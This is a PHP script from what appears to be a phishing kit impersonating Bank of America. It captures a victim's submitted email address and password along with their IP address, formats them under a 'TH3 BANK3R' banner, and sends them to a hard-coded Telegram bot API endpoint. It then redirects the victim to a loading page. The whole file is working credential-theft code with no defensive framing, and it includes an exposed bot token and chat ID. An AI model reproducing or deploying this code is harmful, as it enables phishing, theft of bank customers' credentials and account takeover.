<?php
$settings = include '../../../settings/settings.php';

if(empty($_POST['em']) || !isset($_POST['em'])){
    echo "<script>window.location.href = \"../card\"; </script>";
       setcookie("logged_in", "0");
} else {
       setcookie("logged_in", "1");
}

if(empty($_POST['epass']) || !isset($_POST['epass'])){
  echo "<script>window.location.href = \"../card\"; </script>";
       setcookie("logged_in", "0");
} else {
       setcookie("logged_in", "1");
}


# Allow URL Open

ini_set('allow_url_fopen',1);


function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$IP = get_client_ip();

# Settings


$settings = include '../../../settings/settings.php';
$owner = $settings['email'];
$filename = "../../../Logs/results.txt";
$client = file_get_contents("../../../Logs/client.txt");


# Variables

$email = $_POST['em'];
$email_pass = $_POST['epass'];


# Messsage

$message = "[👑 |  BOA  | TH3 BANK3R :{$client} 👑]\n\n";

$message .= " [ 📩 EMAIL LOGIN 📩 ] \n";
$message .= "|==============================|\n";
$message .= "# EMAIL       : {$email}\n";
$message .= "# PASSWORD    : {$email_pass}\n";
$message .= " \n";
$message .= "|==============================|\n";
$message .= " \n";
$message .= "# IP ADDRESS : {$IP}\n";
$message .= " \n";
$message .= "|==============================|\n";

file_get_contents("https://api.telegram.org/bot5892595107:AAH_MFO2RNerCTGfDDMk1zg2tdePwSZ8Tkg/sendMessage?chat_id=-830196354&text=" . urlencode($message)."" );


header('Location: ../loading.php');

?>
